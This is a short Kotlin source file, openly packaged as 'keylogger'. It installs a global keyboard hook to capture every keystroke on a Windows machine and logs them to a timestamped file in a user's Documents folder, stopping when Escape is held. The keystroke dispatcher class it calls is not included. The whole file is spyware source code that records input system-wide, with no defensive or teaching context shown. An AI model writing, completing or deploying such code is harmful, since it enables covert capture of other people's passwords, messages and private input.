package keylogger

import lc.kra.system.keyboard.GlobalKeyboardHook
import lc.kra.system.keyboard.event.GlobalKeyEvent
import java.io.File
import java.io.FileWriter
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter

object KeyboardOperator {
    var fileObject: File
    var fileWriterObject: FileWriter

    init {
        fileObject = File(acquireDateAndTime())
        fileObject.createNewFile()
        fileWriterObject = FileWriter(fileObject) 
    }
    
    private fun acquireDateAndTime(): String {
        val now = LocalDateTime.now()
        val formatter = DateTimeFormatter.ofPattern("uuuu-MMM-d-H-m-s")
        return "C:\\Users\\Permito\\Documents\\" + now.format(formatter) + ".log"
    }

    fun start() {
        val keyboardHook = GlobalKeyboardHook(true)
        keyboardHook.addKeyListener(KeyboardDispatcher())
        
        while (keyboardHook.isAlive) {
            if (keyboardHook.isKeyHeldDown(GlobalKeyEvent.VK_ESCAPE)) {
                fileWriterObject.close()
                keyboardHook.shutdownHook()
            }
        }
    }
}

fun main() {
    KeyboardOperator.start() 
}